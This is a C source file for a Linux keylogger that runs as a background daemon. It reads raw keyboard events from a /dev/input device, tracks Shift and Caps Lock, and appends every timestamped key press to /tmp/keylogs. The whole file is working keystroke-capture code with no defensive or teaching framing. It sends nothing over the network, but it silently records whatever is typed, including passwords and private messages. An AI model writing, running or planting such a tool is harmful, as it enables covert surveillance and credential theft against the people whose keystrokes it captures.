#include <stdio.h>
#include <fcntl.h>
#include <sys/syslog.h>
#include <unistd.h>
#include <linux/input.h>
#include <time.h>
#include <errno.h>
#include <syslog.h>
#include <sys/ioctl.h>
#include "keycodes.h"
#include "daemonize.h"

int main(int argc, char * argv[]){
        if (argc != 2){
            printf("Usage: %s <event-file>\n e.g. %s /dev/input/event7\n", argv[0], argv[0]);
            return 1;
        }
        daemonize();
        openlog("kelogger", LOG_PID, LOG_DAEMON);

        int fd = open(argv[1], O_RDONLY, 0);
        if (fd < 0){
            syslog(LOG_ERR, "open failed %m"); //%m stderr(errno)
            return 1;
        }

        // read initial caps lock state from keyboard LED
        
        FILE *logfile = fopen("/tmp/keylogs", "a"); //append mode
        if (!logfile){
            syslog(LOG_ERR, "fopen failed %m"); //%m stderr(errno)
            return 1;
        }
        
        struct input_event ie;

        
        int shift_held = 0;

        //Get caps_on state
        int led_state = 0;
        ioctl(fd, EVIOCGLED(sizeof(led_state)), &led_state);
        int caps_on = (led_state >> 1) & 1;

        while(1){         
            ssize_t result = read(fd, &ie, sizeof(ie));
            if (result != sizeof(ie)) {
                if (errno == EBADF) {
                    syslog(LOG_ERR, "read failed: %m. Try opening keyboard input event file as root?");
                } else {
                     syslog(LOG_ERR, "read failed: %m");
                }
                break;
            }
            
            time_t t = ie.time.tv_sec;
            struct tm *tm_info = localtime(&t);
            char timebuf[32];
            strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", tm_info);
    
            if (ie.type != 1){
                continue;
            }
            if (ie.code == 42 || ie.code == 54){
                shift_held = (ie.value == 1);
                continue;
            }
            if (ie.code == 58){
                if (ie.value == 1)
                    caps_on = !caps_on;
                fprintf(logfile, "[%s] [CAPSLOCK]\n", timebuf);
                 continue;
            }
            if (ie.value == 1){
                int use_upper = shift_held ^ caps_on;
                const char *key = use_upper ? keycode_to_str_shifted(ie.code)
                                            : keycode_to_str(ie.code);
                fprintf(logfile, "[%s] %s\n", timebuf, key);
                fflush(logfile);
            }
        }

    
    close(fd);
    fclose(logfile);
    closelog();
    return 0;
}

